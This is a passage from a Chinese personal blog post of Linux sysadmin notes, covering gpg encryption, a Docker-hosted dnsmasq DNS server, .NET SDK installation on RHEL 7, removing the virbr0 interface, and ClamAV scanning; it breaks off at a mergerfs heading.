<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>那些杂七杂八的记录(一) - 一个曾经的小码农...</title><meta name="author" content="0x5c0f">
<meta name="description" content="那些杂七杂八的记录(一)"><meta name="keywords" content='linux, 解决方案'>
  <meta itemprop="name" content="那些杂七杂八的记录(一)">
  <meta itemprop="description" content="那些杂七杂八的记录(一)">
  <meta itemprop="datePublished" content="2021-08-04T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-10-09T00:00:00+00:00">
  <meta itemprop="wordCount" content="3189">
  <meta itemprop="image" content="https://blog.0x5c0f.cc/icons/logo_avatar.png">
  <meta itemprop="keywords" content="Linux,解决方案"><meta property="og:url" content="https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/">
  <meta property="og:site_name" content="一个曾经的小码农...">
  <meta property="og:title" content="那些杂七杂八的记录(一)">
  <meta property="og:description" content="那些杂七杂八的记录(一)">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-08-04T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-10-09T00:00:00+00:00">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="解决方案">
    <meta property="og:image" content="https://blog.0x5c0f.cc/icons/logo_avatar.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://blog.0x5c0f.cc/icons/logo_avatar.png">
  <meta name="twitter:title" content="那些杂七杂八的记录(一)">
  <meta name="twitter:description" content="那些杂七杂八的记录(一)">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/" title="那些杂七杂八的记录(一) - 一个曾经的小码农..." /><link rel="prev" type="text/html" href="https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.2/" title="那些杂七杂八的记录(二)" /><link rel="next" type="text/html" href="https://blog.0x5c0f.cc/posts/linux/shellscript%E7%9B%B8%E5%85%B3/" title="Shellscript相关" /><link rel="alternate" type="text/markdown" href="https://blog.0x5c0f.cc/posts/linux/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/index.md" title="那些杂七杂八的记录(一) - 一个曾经的小码农..."><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "那些杂七杂八的记录(一)",
    "inLanguage": "zh-cn",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/blog.0x5c0f.cc\/posts\/linux\/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1\/"
    },"genre": "posts","keywords": "linux, 解决方案","wordcount":  3189 ,
    "url": "https:\/\/blog.0x5c0f.cc\/posts\/linux\/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1\/","datePublished": "2021-08-04T00:00:00+00:00","dateModified": "2024-10-09T00:00:00+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "0x5c0f"
      },"description": "那些杂七杂八的记录(一)"
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="一个曾经的小码农..."><span class="typeit"><template>0x5c0f.cc</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/">所有文章</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/">标签</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/">分类</a></li><li class="menu-item">
              <a class="menu-link" href="/collections/">合集</a></li><li class="menu-item">
              <a class="menu-link" href="/about/">About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="一个曾经的小码农..."><span class="typeit"><template>0x5c0f.cc</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/">所有文章</a></li><li class="menu-item"><a class="menu-link" href="/tags/">标签</a></li><li class="menu-item"><a class="menu-link" href="/categories/">分类</a></li><li class="menu-item"><a class="menu-link" href="/collections/">合集</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>那些杂七杂八的记录(一)</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="https://blog.0x5c0f.cc" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
    0x5c0f</a></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/linux/" class="post-category" title="分类 - Linux"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Linux</a>&ensp;<a href="/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/" class="post-category" title="分类 - 运维记事"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 运维记事</a> 和 <a href="/collections/%E6%9D%82%E8%AE%B0/" class="post-collection" title="合集 - 杂记"><i class="fa-solid fa-layer-group fa-fw" aria-hidden="true"></i> 杂记</a></span></div><div class="post-meta-line"><span title="发布于 2021-08-04 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-08-04">2021-08-04</time></span>&nbsp;<span title="更新于 2024-10-09 00:00:00"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2024-10-09">2024-10-09</time></span>&nbsp;<span title="3189 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3200 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 15 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#gpg-对称加密">gpg 对称加密</a></li>
    <li><a href="#gpg-非对称加密">gpg 非对称加密</a></li>
  </ul>

  <ul>
    <li><a href="#文件描述符">文件描述符</a></li>
    <li><a href="#标准重定向">标准重定向</a></li>
  </ul>

  <ul>
    <li><a href="#单位换算">单位换算</a></li>
    <li><a href="#mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized">mailx smtp使用ssl时，邮件发送报错 &ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&rdquo;</a></li>
    <li><a href="#jenkins-设置国内插件源">jenkins 设置国内插件源</a></li>
  </ul>

  <ul>
    <li><a href="#rabbitmq-ssl-证书配置">rabbitmq ssl 证书配置</a></li>
    <li><a href="#prometheus-不同指标计间的计算方法">prometheus 不同指标计间的计算方法</a></li>
    <li><a href="#iis-http-强制跳转-https">IIS http 强制跳转 https</a></li>
    <li><a href="#find-文件性能提升">find 文件性能提升</a></li>
    <li><a href="#压力测试-ab-命令解释">压力测试 `ab`` 命令解释</a></li>
    <li><a href="#https页面加载http资源报错的方法">https页面加载http资源报错的方法</a></li>
    <li><a href="#mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户">mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户</a></li>
    <li><a href="#windows-iis-反向代理配置">Windows IIS 反向代理配置</a></li>
    <li><a href="#亚马逊存储桶">亚马逊存储桶</a>
      <ul>
        <li><a href="#存储桶规则创建及示例">存储桶规则创建及示例</a></li>
        <li><a href="#亚马逊用户策略">亚马逊用户策略</a></li>
      </ul>
    </li>
    <li><a href="#gnome-shell-终端设置-title">gnome-shell 终端设置 title</a></li>
    <li><a href="#阿里云安装-alinux-操作系统安装-docker">阿里云安装 alinux 操作系统安装 docker</a></li>
    <li><a href="#亚马逊cdn-添加-elb-作为后端源指定多备用域名无效有其他衍生问题-待继续测试">亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 id="gnupg-加密与解密" class="heading-element"><span>GnuPG 加密与解密</span>
  <a href="#gnupg-%e5%8a%a0%e5%af%86%e4%b8%8e%e8%a7%a3%e5%af%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h2 id="gpg-对称加密" class="heading-element"><span>gpg 对称加密</span>
  <a href="#gpg-%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>加密:  <code>gpg -c &lt;file&gt;</code>， 输入两次加密密码，完成后生成文件<code>&lt;file&gt;.gpg</code>(加密后源文件保留)<br>
解密:  <code>gpg &lt;file&gt;.gpg</code>, 输入加密密码,正确后生成文件<code>&lt;file&gt;</code>(解密后加密文件保留)</p>
<h2 id="gpg-非对称加密" class="heading-element"><span>gpg 非对称加密</span>
  <a href="#gpg-%e9%9d%9e%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>非对称加密/解密文件时，<code>Server</code> 生成私钥与公钥，并把公钥发送给<code>Client</code>, <code>Client</code> 使用公钥加密数据，并把加密后的数据传给<code>Server</code> ，<code>Server</code> 最后使用自己的私钥解密数据。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Server: 创建公钥私钥</span>
</span></span><span class="line"><span class="cl">$&gt; gpg --gen-key   <span class="c1"># 需要填写一些东西，可根据需求选择 </span>
</span></span><span class="line"><span class="cl"><span class="c1">## 配置文件介绍</span>
</span></span><span class="line"><span class="cl"><span class="c1"># GPG 配置文件目录:~/.gnupg</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/gpg.conf – 配置文件</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/trustdb.gpg – 信任库</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/pubring.gpg – 公钥库</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ~/.gnupg/secring.gpg – 私钥库 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$&gt; gpg --list-key  <span class="c1"># 密钥查看 </span>
</span></span><span class="line"><span class="cl">$&gt; gpg -a --export &lt;UserID&gt; &gt; ./public-key.pub <span class="c1"># Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 &lt;UserID&gt; 被标记为绝对信任  </span>
</span></span><span class="line"><span class="cl"><span class="c1"># 将公钥传送到Client上 </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Client: 导入 公钥 </span>
</span></span><span class="line"><span class="cl">$&gt; gpg --import ./public-key.pub 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Client: 文件加密 </span>
</span></span><span class="line"><span class="cl">$&gt; gpg -e -r &lt;UserID&gt; &lt;file&gt; 
</span></span><span class="line"><span class="cl">&lt;file&gt;.gpg 
</span></span><span class="line"><span class="cl"><span class="c1"># 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Server: 文件解密 </span>
</span></span><span class="line"><span class="cl">$&gt; gpg -d &lt;file&gt;.gpg 
</span></span><span class="line"><span class="cl">&lt;file&gt; </span></span></code></pre></td></tr></table>
</div>
</div><h2 id="docker-创建-dns-server" class="heading-element"><span>DOCKER 创建 DNS SERVER</span>
  <a href="#docker-%e5%88%9b%e5%bb%ba-dns-server" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; vim /data/docker/dns/dnsmasq.conf 
</span></span><span class="line"><span class="cl"><span class="c1">#dnsmasq config, for a complete example, see:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  http://oss.segetech.com/intra/srv/dnsmasq.conf</span>
</span></span><span class="line"><span class="cl"><span class="c1">#log all dns queries</span>
</span></span><span class="line"><span class="cl">log-queries
</span></span><span class="line"><span class="cl"><span class="c1">#dont use hosts nameservers</span>
</span></span><span class="line"><span class="cl">no-resolv
</span></span><span class="line"><span class="cl"><span class="c1">#use cloudflare as default nameservers, prefer 1^4</span>
</span></span><span class="line"><span class="cl"><span class="nv">server</span><span class="o">=</span>8.8.4.4
</span></span><span class="line"><span class="cl"><span class="nv">server</span><span class="o">=</span>8.8.8.8
</span></span><span class="line"><span class="cl">strict-order
</span></span><span class="line"><span class="cl"><span class="c1">#serve all .company queries using a specific nameserver</span>
</span></span><span class="line"><span class="cl"><span class="nv">server</span><span class="o">=</span>/company/10.0.0.1
</span></span><span class="line"><span class="cl"><span class="c1">#explicitly define host-ip mappings</span>
</span></span><span class="line"><span class="cl"><span class="nv">address</span><span class="o">=</span>/www.example.com/172.16.10.10
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$&gt; docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt <span class="s2">&#34;max-size=100m&#34;</span> -e <span class="s2">&#34;HTTP_USER=root&#34;</span> -e <span class="s2">&#34;HTTP_PASS=root&#34;</span> jpillora/dnsmasq</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="dotnet-环境搭建" class="heading-element"><span>dotnet 环境搭建</span>
  <a href="#dotnet-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
</span></span><span class="line"><span class="cl">$&gt; yum install libgdiplus-devel libunwind icu -y 
</span></span><span class="line"><span class="cl">$&gt; wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm
</span></span><span class="line"><span class="cl">$&gt; yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y
</span></span><span class="line"><span class="cl">$&gt; dotnet --info
</span></span><span class="line"><span class="cl"><span class="c1"># supervisor 管理 https://blog.0x5c0f.cc/2019/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86</span>
</span></span><span class="line"><span class="cl">yum install supervisor -y
</span></span><span class="line"><span class="cl"><span class="c1"># 前端管理样式页面 </span>
</span></span><span class="line"><span class="cl">/usr/lib/python2.7/site-packages/supervisor/ui/status.html</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="在linux中删除virbr0接口" class="heading-element"><span>在Linux中删除virbr0接口</span>
  <a href="#%e5%9c%a8linux%e4%b8%ad%e5%88%a0%e9%99%a4virbr0%e6%8e%a5%e5%8f%a3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><code>virbr0</code>是<code>CentOS7</code>在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; virsh net-list 
</span></span><span class="line"><span class="cl">$&gt; virsh net-destroy default 
</span></span><span class="line"><span class="cl">$&gt; virsh net-undefine default
</span></span><span class="line"><span class="cl">$&gt; systemctl restart libvirtd.service</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux-杀毒软件-clamav" class="heading-element"><span>Linux 杀毒软件 clamav</span>
  <a href="#linux-%e6%9d%80%e6%af%92%e8%bd%af%e4%bb%b6-clamav" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 需要安装epel源</span>
</span></span><span class="line"><span class="cl">$&gt;　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
</span></span><span class="line"><span class="cl"><span class="c1"># 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example </span>
</span></span><span class="line"><span class="cl"><span class="c1"># 更新病毒库　</span>
</span></span><span class="line"><span class="cl">$&gt; /usr/bin/freshclam
</span></span><span class="line"><span class="cl"><span class="c1"># 扫描 </span>
</span></span><span class="line"><span class="cl">$&gt; clamscan -ri /data --remove  -l /var/log/clamscan.log </span></span></code></pre></td></tr></table>
</div>
</div><h2 id="linux-合并文件系统-margerfs" class="heading-element"><span>linux 合并文件系统 margerfs</span>
  <a href="#linux-%e5%90%88%e5%b9%b6%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f-margerfs" class="heading-mark">
